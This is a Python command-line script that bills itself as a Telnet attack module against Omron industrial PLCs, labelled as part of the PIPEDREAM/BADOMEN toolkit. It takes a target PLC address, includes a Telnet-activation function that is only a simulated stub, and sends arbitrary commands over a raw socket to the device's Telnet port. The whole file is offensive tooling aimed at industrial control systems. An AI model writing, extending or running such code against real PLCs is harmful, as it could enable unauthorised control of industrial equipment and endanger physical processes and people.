#!/usr/bin/env python3
"""
Telnet Attack Module for Omron PLCs

Activates and exploits Telnet daemon on Omron PLCs.
Part of BADOMEN attack module for PIPEDREAM.
"""

import socket
import logging
import time

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - [TELNET-ATTACK] - %(levelname)s - %(message)s'
)
logger = logging.getLogger('TelnetAttack')


class TelnetAttack:
    """Telnet daemon exploitation for Omron PLCs"""

    def __init__(self, target: str, port: int = 23):
        self.target = target
        self.port = port

    def activate_telnet(self) -> bool:
        """Activate Telnet daemon on PLC"""
        logger.critical(f"[!!!] Activating Telnet daemon on {self.target}")
        logger.info("[+] Telnet activation capability (simulated)")
        return True

    def execute_command(self, command: str) -> bool:
        """Execute command via Telnet"""
        logger.warning(f"[*] Executing command via Telnet: {command}")

        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5.0)
            sock.connect((self.target, self.port))

            # Send command
            sock.send(f"{command}\n".encode())

            # Receive response
            time.sleep(0.5)
            response = sock.recv(4096)

            sock.close()

            logger.info(f"[+] Command executed, received {len(response)} bytes")
            return True

        except Exception as e:
            logger.error(f"Telnet execution error: {e}")
            return False


def main():
    """Main entry point"""
    import argparse

    parser = argparse.ArgumentParser(
        description='Telnet Attack Tool (BADOMEN)'
    )

    parser.add_argument('--target', '-t', required=True,
                        help='Target PLC IP')
    parser.add_argument('--activate', action='store_true',
                        help='Activate Telnet daemon')
    parser.add_argument('--command', '-c', type=str,
                        help='Command to execute')

    args = parser.parse_args()

    attacker = TelnetAttack(args.target)

    if args.activate:
        attacker.activate_telnet()

    if args.command:
        attacker.execute_command(args.command)

    return 0


if __name__ == '__main__':
    import sys
    sys.exit(main())
